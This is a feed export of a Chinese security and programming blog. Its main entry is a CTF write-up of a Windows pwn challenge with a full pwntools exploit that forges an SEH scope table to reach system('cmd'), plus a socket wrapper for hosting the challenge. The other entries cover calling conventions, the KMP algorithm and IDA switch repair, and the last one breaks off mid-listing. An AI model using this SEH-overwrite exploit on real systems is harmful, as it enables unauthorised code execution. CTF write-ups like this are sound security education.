  <entry>
    <title>Windows_第五空间2019决赛pwn9</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/</id>
    <published>2022-10-05T13:08:38.000Z</published>
    <updated>2022-10-05T13:09:50.777Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-第五空间2019-决赛-PWN9"><a href="#Windows-第五空间2019-决赛-PWN9" class="headerlink" title="[Windows][第五空间2019 决赛]PWN9"></a>[Windows][第五空间2019 决赛]PWN9</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled.png" alt="Untitled"></p><p>程序给出了main和stack地址，而且有栈溢出的漏洞。并且有任意地址读。</p><p>由于程序在最好直接调用exit(0)退出程序，所有利用栈溢出覆盖返回地址是不太可能的。</p><p>切到汇编可以看到存在try_except结构，想起了windows SEH，在栈内会保存一个异常处理函数的地址，猜测与这个有关</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%201.png" alt="Untitled"></p><p>这是函数一开始在栈内加入的一个Exception节点</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%202.png" alt="Untitled"></p><p>可以看出大概的定义是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">DWORD next;</span><br><span class="line">DWORD __exception_handler;</span><br><span class="line">DWORD _off_struc ^ __security_cookie;   <span class="comment">//这里进行了异或加密处理</span></span><br><span class="line">DWORD __try_level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分代码是构造一个节点并加入到ExceptionList的头部 （头插法,fs:[0] 保存的是ExceptionListHead）</p><p>当程序出现异常时，会从ExceptionListHead寻找异常处理程序去执行,详细的介绍等参考window SEH</p><p>看看这个结构体里面是啥</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%203.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%204.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%205.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%206.png" alt="Untitled"></p><p>一个是__except filter ,一个是__except 处理代码 (如果是嵌套try的话，这里会有多组 filter+except )</p><p>那么就能伪造一个结构体，把__except处理代码的地址改为我们想要执行的代码，而且这道题目中是有 system(”cmd”)的，只要跳到这里就行:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%207.png" alt="Untitled"></p><p>伪造好这个结构体之后，把栈内那个节点的第三个成员替换为 这个结构体的地址^__security_cookie </p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10086</span>)</span><br><span class="line"></span><br><span class="line">def int32(val):</span><br><span class="line">    val = val &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> val &amp; <span class="number">0x80000000</span>:</span><br><span class="line">        val =  -(<span class="number">0x100000000</span> - val)</span><br><span class="line">        print(val)</span><br><span class="line">    <span class="keyword">else</span>:           <span class="meta">#unsigned </span></span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line">    p.sendlineafter(b<span class="number">&#x27;</span>Answer<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>yes<span class="number">&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="number">&#x27;</span>know<span class="number">&#x27;</span>,str(int32(addr)).encode())</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>value is <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    d = p.recvline()[:-1]</span></span><br><span class="line"><span class="string">    return int(d,16)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil(b&#x27;</span><span class="built_in">stack</span> address = <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">stack_addr = int(p.recvline()[:-1],16)</span></span><br><span class="line"><span class="string">p.recvuntil(b&#x27;</span>main address = <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">main_addr  = int(p.recvline()[:-1],16)</span></span><br><span class="line"><span class="string">base = main_addr - (0x000510B0 - 0x00051000 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">success(&#x27;</span>stack_addr:<span class="string">&#x27; + hex(stack_addr))</span></span><br><span class="line"><span class="string">success(&#x27;</span>main_addr:<span class="string">&#x27; + hex(main_addr))</span></span><br><span class="line"><span class="string">success(&#x27;</span>base_addr:<span class="string">&#x27; + hex(base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">backdoor = base + 0x05138D - 0x51000 </span></span><br><span class="line"><span class="string">filter_func = base + 0x051348 - 0x51000</span></span><br><span class="line"><span class="string">#栈溢出伪造SEH结构体</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_struc_addr = stack_addr + 128 + 4 + 0x18           ##0x53688 ##</span></span><br><span class="line"><span class="string">struc = b&#x27;</span>&#x27;</span><br><span class="line">struc += p32(<span class="number">0xFFFFFFE4</span>)</span><br><span class="line">struc += p32(<span class="number">0</span>)</span><br><span class="line">struc += p32(<span class="number">0x0FFFFFF20</span>)</span><br><span class="line">struc += p32(<span class="number">0</span>)</span><br><span class="line">struc += p32(filter_func)</span><br><span class="line">struc += p32(backdoor)</span><br><span class="line"></span><br><span class="line">#<span class="meta">#leak stack data,不知道改了会出啥问题</span></span><br><span class="line">##先laek 出来再覆盖</span><br><span class="line">d = b<span class="number">&#x27;&#x27;</span></span><br><span class="line">##</span><br><span class="line">__security_cookie = leak(base + <span class="number">0x0054004</span> - <span class="number">0x51000</span>)</span><br><span class="line">success(<span class="string">&#x27;__security_cookie:&#x27;</span> + hex(__security_cookie))</span><br><span class="line"></span><br><span class="line">payload = b<span class="number">&#x27;</span>\xff<span class="number">&#x27;</span> * <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">5</span>:</span><br><span class="line">        payload += p32(fake_struc_addr ^ __security_cookie)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        val = leak(stack_addr + <span class="number">128</span> + <span class="number">4</span> * i)</span><br><span class="line">        payload += p32(val)</span><br><span class="line"></span><br><span class="line">payload += struc</span><br><span class="line">assert(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span> not in payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="number">&#x27;</span>Answer<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>no<span class="number">&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="meta">#getshell</span></span><br><span class="line">p.sendlineafter(b<span class="number">&#x27;</span>Answer<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>yes<span class="number">&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="number">&#x27;</span>know<span class="number">&#x27;</span>,b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="为什么不直接修改-exception-handler为异常处理程序"><a href="#为什么不直接修改-exception-handler为异常处理程序" class="headerlink" title="为什么不直接修改__exception_handler为异常处理程序?"></a>为什么不直接修改__exception_handler为异常处理程序?</h3><p>会检查handler的有效性，不能随便瞎写</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%208.png" alt="Untitled"></p><p>我直接修改了__exception_handler之后，这里直接失败，(至于是咋检查的，还没仔细研究…..)</p><h3 id="题目环境搭建"><a href="#题目环境搭建" class="headerlink" title="题目环境搭建"></a>题目环境搭建</h3><p>不知道咋搞，简单写了一个程序重定向输入输出:</p><p>(socket函数创建的socket无法通过ReadFile和WriteFile直接读写数据，WSASocket的可以，这里试了一下WSAAccept也是可以的，所以可以直接修改pwn.exe的输出输出为socket.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVICE_PATH <span class="string">&quot;C:\\Users\\lenovo\\Desktop\\zip\\pwn.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTEN_PORT 10086</span></span><br><span class="line"></span><br><span class="line">DWORD __stdcall <span class="title function_">OnAccpet</span><span class="params">(LPVOID lpParam)</span>&#123;</span><br><span class="line">HANDLE hFile = (HANDLE)lpParam;</span><br><span class="line">DWORD dwWriteBytes = <span class="number">0</span>;</span><br><span class="line">STARTUPINFOA si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">si.hStdError = hFile;</span><br><span class="line">si.hStdOutput = hFile;</span><br><span class="line">si.hStdInput = hFile;</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Run Process....</span></span><br><span class="line">CreateProcessA(SERVICE_PATH, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, TRUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭socket</span></span><br><span class="line">closesocket((SOCKET)hFile);</span><br><span class="line">WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), <span class="string">&quot;service_exit\n&quot;</span>, <span class="number">13</span>,&amp;dwWriteBytes , <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">WSADATA wsadata;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">0</span>), &amp;wsadata);</span><br><span class="line"></span><br><span class="line">sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">addr.sin_addr.S_un.S_addr = INADDR_ANY;</span><br><span class="line">addr.sin_port = htons(LISTEN_PORT);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">SOCKET listenSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bind(listenSocket, (sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">listen(listenSocket,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">sockaddr_in clientAddr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> addr_len = <span class="keyword">sizeof</span>(clientAddr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accpet...\n&quot;</span>);</span><br><span class="line">SOCKET Client = WSAAccept(listenSocket, (sockaddr*)&amp;clientAddr, &amp;addr_len, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, OnAccpet,(LPVOID)Client, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows-第五空间2019-决赛-PWN9&quot;&gt;&lt;a href=&quot;#Windows-第五空间2019-决赛-PWN9&quot; class=&quot;headerlink&quot; title=&quot;[Windows][第五空间2019 决赛]PWN9&quot;&gt;&lt;/a&gt;[Windows][第五</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>cdecl与stdcall混用</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/03/cdecl%E4%B8%8Estdcall%E6%B7%B7%E7%94%A8/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/03/cdecl%E4%B8%8Estdcall%E6%B7%B7%E7%94%A8/</id>
    <published>2022-10-02T16:01:54.000Z</published>
    <updated>2022-10-02T16:11:09.140Z</updated>
    
    <content type="html"><![CDATA[<p>__cdecl 调用约定是由调用者来清理栈,像printf这些可变参数就是通过 cdecl来实现的<br>stdcall 是由被调用者清理栈空间的,它的参数个数必须是固定的,因为函数结束时esp&#x2F;rsp调整的数量值是固定的</p><p>在使用的时候有的dll内部的函数是cdecl类型的，但是在源码中声明的时候写成了stdcall,这样就导致了函数结束时,并没有清理栈空间,然而大多数情况下程序仍然可以正常运行,因为没有影响局部变量区域,局部变量的操作是通过rbp&#x2F;rbp来进行的。只是会造成栈空间的浪费，函数结束时leave指令可以使rsp&#x2F;esp回到正常的位置。</p><p>反过来,如果dll里面的是stdcall的函数,但是我通过cdecl的方式去调用.这肯定是会出问题的,esp&#x2F;rsp被调整了两次,已经歪的很厉害了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;__cdecl 调用约定是由调用者来清理栈,像printf这些可变参数就是通过 cdecl来实现的&lt;br&gt;stdcall 是由被调用者清理栈空间的,它的参数个数必须是固定的,因为函数结束时esp&amp;#x2F;rsp调整的数量值是固定的&lt;/p&gt;
&lt;p&gt;在使用的时候有的dll内部</summary>
      
    
    
    
    <category term="C语言" scheme="https://h4ckf0rfun.github.io/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-10-02</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/02/2022-10-02/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/02/2022-10-02/</id>
    <published>2022-10-02T15:49:04.000Z</published>
    <updated>2022-10-02T15:50:50.688Z</updated>
    
    <content type="html"><![CDATA[<p>如果前进有困难，那就尝试后退几步</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果前进有困难，那就尝试后退几步&lt;/p&gt;
</summary>
      
    
    
    
    <category term="日记" scheme="https://h4ckf0rfun.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>kmp</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/28/kmp/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/28/kmp/</id>
    <published>2022-09-28T13:57:25.000Z</published>
    <updated>2022-09-28T13:59:35.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kmp"><a href="#kmp" class="headerlink" title="kmp"></a>kmp</h1><h3 id="关键"><a href="#关键" class="headerlink" title="关键:"></a>关键:</h3><ol><li>求出next数组， (可以根据next数组计算出遇到不匹配时应该向后跳多远，即有公共前后缀的情况，next里面保存了从subString起始位置到当前位置这部分字符串的最长公共前后缀)</li><li>公共前后缀</li><li>充分利用已知</li></ol><h3 id="如何在O-n-内计算出subString-的-next数组"><a href="#如何在O-n-内计算出subString-的-next数组" class="headerlink" title="如何在O(n) 内计算出subString 的 next数组:"></a>如何在O(n) 内计算出subString 的 next数组:</h3><p>直接上代码吧:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _get_next(<span class="type">const</span> <span class="type">char</span>*s)&#123;</span><br><span class="line">size = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="type">int</span> now = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> it = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (it = <span class="number">1</span>; it &lt; size;)&#123;</span><br><span class="line"><span class="keyword">if</span> (s[now] == s[it])&#123;</span><br><span class="line">next[it] = now + <span class="number">1</span>;</span><br><span class="line">now++;</span><br><span class="line">it++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (now &gt; <span class="number">0</span>)&#123;</span><br><span class="line">now = next[now - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">next[it] = <span class="number">0</span>;</span><br><span class="line">it++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中now实际保存的是最长公共前后缀的结束部分 (由于最长公共前后缀前面有一个，后面有一个，这里的now是保存前面的那个,即从0 到 now 的位置这部分 ，是因为从0到n一定会包含这部分)</p><p>上面的代码中实际只有两种情况:</p><ol><li><p>it与now 指向的字符相同的情况, 这时我们可以根据 0: it-1 这部分的最长公共前后缀，求出0 : it这部分的最长公共前后缀. (直接加1即可) 然后it++, now++ (now始终是前面那部分最长公共前后缀的结束位置)</p></li><li><p>it与now 指向的字符不同的情况, 那么接下来就应该直接将now重新置为0吗??? 此时应该缩小公共前后缀的长度  ，只需要找出最长公共前后缀的的最长公共前后缀即可 (假设存在更小的公共前后缀，那么它一定是包含在最长公共前后缀中的) (认真思考缩小公共前后缀的原因)</p></li></ol><p>之后strstr的实现根据next的数组就很容易写出来了:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">mystrstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*string,<span class="type">const</span>  <span class="type">char</span>*sub)</span></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*now = <span class="number">0</span>,*it;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get next array;</span></span><br><span class="line">_get_next(sub);</span><br><span class="line">now = string;</span><br><span class="line">it = now;</span><br><span class="line"><span class="keyword">while</span> (*now)&#123;</span><br><span class="line"><span class="keyword">while</span> (*it == sub[it - now] &amp;&amp; (it - now) &lt; size)</span><br><span class="line">it++;</span><br><span class="line"><span class="keyword">if</span> ((it - now) == size)&#123;</span><br><span class="line"><span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (it == now)&#123;</span><br><span class="line">now++;</span><br><span class="line">it = now;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//遇到不匹配的,看一下跳几步</span></span><br><span class="line">now += (it - now) - next[it - now - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kmp&quot;&gt;&lt;a href=&quot;#kmp&quot; class=&quot;headerlink&quot; title=&quot;kmp&quot;&gt;&lt;/a&gt;kmp&lt;/h1&gt;&lt;h3 id=&quot;关键&quot;&gt;&lt;a href=&quot;#关键&quot; class=&quot;headerlink&quot; title=&quot;关键:&quot;&gt;&lt;/a&gt;关键:&lt;/h3&gt;</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>IDA修复switch语句</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/</id>
    <published>2022-09-27T13:18:01.000Z</published>
    <updated>2022-09-27T13:19:22.906Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDA-switch语句修复"><a href="#IDA-switch语句修复" class="headerlink" title="IDA switch语句修复"></a>IDA switch语句修复</h1><p>下面是一段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(a)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your input is 0\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 1\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 2\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 3\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 4\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 5\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 6\n&quot;</span>);</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;your input is 7\n&quot;</span>);</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;your input is 8\n&quot;</span>);</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译后，先看看生成的汇编代码是啥样子的，这里直接从输入a的值之后开始看: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000011B</span>E                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">00000000000011</span>C3                 mov     eax, [rbp+var_C] ; <span class="keyword">switch</span> <span class="number">8</span> cases</span><br><span class="line">.text:<span class="number">00000000000011</span>C6                 cmp     eax, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000000011</span>C9                 ja      loc_126F</span><br><span class="line">.text:<span class="number">00000000000011</span>CF                 mov     eax, eax</span><br><span class="line">.text:<span 